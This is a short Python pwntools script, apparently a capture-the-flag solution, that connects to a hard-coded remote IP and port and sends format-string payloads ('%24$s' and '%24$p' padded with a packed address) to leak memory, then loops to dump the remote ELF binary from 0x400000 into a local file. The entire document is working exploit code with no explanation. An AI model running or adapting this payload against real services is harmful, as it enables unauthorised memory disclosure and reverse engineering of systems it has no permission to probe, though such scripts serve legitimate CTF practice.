from pwn import *
import struct

#context.log_level='DEBUG'

r = remote('47.75.182.113', 9999)

def dump(addr,frmt='s'):
	raw_addr = struct.pack("Q", addr)
	if "\n" in raw_addr:
		return ("", "")
	leak_part = "|%24${}|".format(frmt)
	payload = leak_part.ljust(136, "A")+"EOF_hitb"+raw_addr
	r.sendline(payload)
	x = r.recvuntil('EOF_hitb')
	return x.split('|')[1], x

#print dump(0x4242424141414141, 'p')
print dump(0x400000, 'p')
print dump(0x400000, 's')
addr = 0x400000
while True:
	with open('dump.elf', 'a') as f:
		leak = dump(addr, 's')[0]+"\x00"
		addr += len(leak)
		f.write(leak)
		f.flush()
